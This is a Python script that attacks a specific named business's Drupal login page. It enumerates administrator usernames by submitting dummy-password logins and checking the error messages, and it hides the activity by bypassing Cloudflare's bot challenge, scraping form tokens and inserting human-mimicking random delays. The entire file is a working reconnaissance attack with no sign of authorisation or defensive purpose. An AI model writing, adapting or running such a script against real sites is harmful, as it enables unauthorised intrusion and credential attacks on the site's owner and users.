import cloudscraper
import time
import random
from bs4 import BeautifulSoup

target_url = "https://www.montcalmautosales.com/user/login"
usernames = ["admin", "webmaster", "editor", "drupal_admin", "it_staff"]

def stealth_account_test():
    # Automatically handles Cloudflare challenges
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
    )
    
    print(f"[*] Initializing stealth session with cloudscraper for {target_url}...")

    for user in usernames:
        try:
            # 1. GET the login page
            initial_resp = scraper.get(target_url, timeout=10)
            
            # 2. Extract CSRF token
            soup = BeautifulSoup(initial_resp.text, 'html.parser')
            form_build_id = soup.find('input', {'name': 'form_build_id'})['value']
            
            # Human-mimicking delay
            time.sleep(random.uniform(5, 12))

            # 3. Attempt login
            payload = {
                'name': user,
                'pass': 'NotThePassword123!',
                'form_id': 'user_login_form',
                'form_build_id': form_build_id,
                'op': 'Log+in'
            }
            
            response = scraper.post(target_url, data=payload, timeout=10)

            if "Unrecognized username" in response.text:
                print(f"[-] User '{user}' does not exist.")
            else:
                print(f"[!] POTENTIAL HIT: Response changed for '{user}'.")

        except Exception as e:
            print(f"[X] Challenge failed: {e}")

if __name__ == "__main__":
    stealth_account_test()
